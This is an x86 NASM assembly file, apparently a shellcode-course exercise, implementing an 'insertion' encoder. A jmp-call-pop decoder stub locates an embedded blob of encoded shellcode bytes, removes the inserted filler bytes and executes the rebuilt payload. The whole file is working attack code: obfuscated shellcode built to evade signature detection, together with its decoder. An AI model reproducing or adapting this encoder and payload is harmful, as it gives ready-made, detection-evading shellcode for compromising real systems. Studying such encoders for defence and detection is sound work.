; Custom Encoder (Insertion)
; SLAER

global _start:

section .text

_start:


xor ebx, ebx		; Cleared EBX
mul ebx			; cleared EAX, EDX


jmp short caller

decoder:			; Managing pre-requisite

	pop esi			; Got hold of encoded shellcode in ESI using jmp-pop-call technique.
	xor edi,edi			; Also ESI pointing to first character i.e. 0x31 in this case.
	lea edi, [esi+1]	; Now edi pointing to first inserted character i.e. 0x60
	inc al			; Incremented AL by 1


decode: 			; Actual decode routine
	mov bl, byte [esi + eax]
	sub bl, 0x01
	cmp bl, 0x01
	jz short EncodedShell
	mov bl, byte [esi + eax + 1]
	mov byte [edi], bl
	inc edi
	add al, 2
	jmp short decode	


caller:

	call decoder
	EncodedShell: 	db 0x31,0x3f,0xf6,0xa7,0xeb,0xca,0x1a,0x5c,
			db 0x5e,0x77,0x31,0x9a,0xdb,0x4a,0xf7,0xd7,
			db 0xe3,0xb7,0x88,0x9f,0x5e,0x03,0x07,0x3b,
			db 0x89,0xdb,0x76,0x41,0x08,0xb2,0x89,0x52,
			db 0x5e,0x03,0x0c,0x82,0x8d,0x2b,0x1e,0x96,
			db 0x8d,0xe1,0x4e,0x87,0x08,0x04,0x8d,0x8b,
			db 0x56,0x55,0x0c,0x88,0xb0,0x66,0x0b,0xfa,
			db 0xcd,0x53,0x80,0xa9,0xe8,0x2b,0xe1,0x68,
			db 0xff,0xc9,0xff,0x03,0xff,0x75,0x2f,0xe7,
			db 0x62,0xab,0x69,0x93,0x6e,0x6a,0x2f,0xe9,
			db 0x73,0xf1,0x68,0x5e,0x41,0x07,0x42,0xb6,
			db 0x42,0x25,0x42,0x72,0x42,0xd4,0x43,0x1e,
			db 0x43,0xb1,0x43,0x3a,0x43,0x2b,0x2



